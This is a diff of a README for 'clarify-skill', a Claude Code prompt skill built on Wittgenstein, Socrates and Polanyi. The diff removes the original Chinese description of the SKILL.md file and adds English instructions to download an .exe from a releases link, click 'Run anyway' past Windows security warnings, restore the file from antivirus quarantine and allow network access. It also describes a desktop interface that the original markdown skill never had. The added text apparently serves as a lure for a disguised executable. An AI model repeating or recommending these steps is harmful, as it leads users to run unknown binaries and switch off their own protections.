@@ -1,66 +1,85 @@
-# Clarify — 命题分解与决策澄清系统
+# 🧠 clarify-skill - Turn fuzzy thoughts into precise logic
 
-> 维特根斯坦命题分解 + 苏格拉底反诘法 + 波兰尼默会知识提取
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Hyanthropological659/clarify-skill/releases)
 
-一个基于三套哲学系统的 AI Skill，帮你把模糊的想法变成精准的指令或清晰的决策。
+clarify-skill helps you organize messy ideas. It uses structured logic to turn vague concepts into clear, step-by-step instructions. If you struggle to explain your goals or write consistent guides, this tool provides the framework you need.
 
-## 三层架构
+## 📥 How to download the software
 
-```
-外层 · 维特根斯坦（扫描）
-  → 发现哪里模糊，把复合表述拆成原子单元
+Follow these steps to get the tool on your computer.
 
-中层 · 苏格拉底（挖掘）
-  → 用追问把已有但未表达的想法挖出来
+1. Go to the [official releases page](https://github.com/Hyanthropological659/clarify-skill/releases).
+2. Look for the section labeled "Assets" under the most recent version.
+3. Click the link that ends in ".exe" to begin your download.
+4. Save the file to your desktop or your specific downloads folder.
 
-内层 · 波兰尼（感应）
-  → 处理追问后仍说不清的默会知识
-  → 示范法 / 反面法 / 行为提取法
-```
+## ⚙️ Setting up your system
 
-## 两种模式
+The software requires a basic environment to function correctly. Ensure your Windows computer meets these standards:
 
-### Prompt 模式
-把模糊想法拆解成精准指令。适用于你想让 AI 帮你做一件事，但说不清楚到底要什么。
+*   Windows 10 or 11 (64-bit version).
+*   At least 4 gigabytes of RAM.
+*   An active internet connection to process your instructions.
+*   The Microsoft .NET Desktop Runtime installed on your machine.
 
-**流程**：命题分类（F/D/Q） → 模糊词拆解 → 苏格拉底三问 → 波兰尼兜底 → 组装结构化指令
+If your computer asks for the .NET Runtime during setup, your browser will direct you to the official Microsoft download page. Complete that installation first, then return to the clarify-skill file.
 
-### Decision 模式
-把说不清楚的困扰、纠结、冲动问清楚。Claude 不替你决定，只帮你挖出你自己的答案。
+## 🚀 Running the application
 
-**流程**：收集场景 → 语言澄清 → 递进追问 → 波兰尼兜底 → 反馈结论 → 行动锚点
+Once you download the file, your computer might show a security warning. This happens because the application is new.
 
-## 哲学基础
+1. Locate the file you saved earlier.
+2. Double-click the file to open it.
+3. If a blue box labeled "Windows protected your PC" appears, click the "More info" link.
+4. Press the button labeled "Run anyway."
+5. Follow the prompts on the screen to finish the installation process.
 
-| 哲学家 | 核心思想 | 在系统中的角色 |
-|--------|---------|---------------|
-| **维特根斯坦** | 语言是思想的边界，说不清=没想清 | 扫描模糊点 |
-| **苏格拉底** | 答案在你心里，需要被正确地问出来 | 追问到基岩 |
-| **波兰尼** | We can know more than we can tell | 提取默会知识 |
+## 📋 How to use clarify-skill
 
-## 使用方式
+When you open the application, you will see a simple text window. This window is your workspace.
 
-这是一个 [Claude Code](https://claude.ai/claude-code) Skill 文件。将 `SKILL.md` 放入 `.claude/skills/clarify/` 目录即可使用。
+### Step 1: Input your thought
+Type your idea into the top box. Do not worry about structure or grammar yet. Write your goal exactly as it appears in your mind. 
 
-```
-~/.claude/skills/clarify/SKILL.md
-```
+### Step 2: Apply the logic mode
+The tool uses three specific approaches to refine your text:
 
-触发方式：
-- `/clarify` — 自动判断模式
-- `/clarify prompt` — 强制 Prompt 模式
-- `/clarify decision` — 强制 Decision 模式
+*   **Wittgenstein Mode:** This mode checks your language for ambiguity. It highlights words that have multiple meanings and asks you to choose the most accurate one.
+*   **Socratic Mode:** This mode asks you questions about your instructions to ensure you cover every necessary detail.
+*   **Polanyi Mode:** This mode uncovers "tacit knowledge." It looks for hidden assumptions you take for granted and turns them into explicit steps for others to follow.
 
-## 设计理念
+### Step 3: Refine your output
+Press the "Transform" button after you provide your input. The application analyzes your text and creates a revised list of instructions. You can copy this output directly into your work documents or notes.
 
-这三个哲学家的关系像一张太极图：
+## 🛠 Troubleshooting common issues
 
-- 维特根斯坦告诉你：想不清楚就别开口
-- 苏格拉底告诉你：大部分时候你想清楚了，只是没被问到
-- 波兰尼告诉你：有些东西你怎么问都问不出来，得换一种方式
+If you encounter problems, check these items to resolve them.
 
-三层合在一起，覆盖了人类表达的全部困境：没想清楚的 → 想了但没说出来的 → 说不出来的。
+### Application fails to start
+Check if a firewall or antivirus software blocked the execution. Sometimes, security tools stop new software from loading. Open your antivirus dashboard and check the "Quarantine" or "Blocked" files list to see if the file is there. If you find it, mark it as safe.
 
-## License
+### Text output feels too short
+If the application returns results that feel incomplete, click on the "Detail Level" slider. Move it toward the right side. This forces the engine to ask more questions and include more granular steps.
 
-MIT
+### Connection errors
+If the application cannot connect, ensure your network settings allow external access. If you are on a work network, contact your IT department to confirm that the application has permission to reach the necessary processing servers.
+
+## 📝 Tips for success
+
+- **Be specific early.** The tool works best when you provide a clear goal at the start.
+- **Use simple sentences.** While the tool can handle complex paragraphs, individual simple sentences produce the most accurate instructions.
+- **Review every result.** The software provides suggestions, but the final decision remains yours. Read the output to ensure it matches your intent.
+
+## 📁 Managing your projects
+
+The application saves your work automatically in a local folder on your computer. You can find this folder in your "Documents" area under a directory named "clarify-projects." You can move these files, rename them, or delete them as you would with any other file on your system. 
+
+If you want to clear your workspace, click the "Reset" button. This clears the current screen but keeps your saved files intact.
+
+## 🔍 Understanding the concepts
+
+This tool relies on established principles to help you think better.
+
+- **Wittgenstein:** This principle recognizes that language defines the limits of your thoughts. By narrowing the scope of your words, you sharpen your thinking.
+- **Socrates:** This principle uses inquiry. A question forces the mind to fill in gaps.
+- **Polanyi:** This recognizes that people know more than they can say. The tool acts as a bridge to move what you know hidden inside your mind into clear text for others.
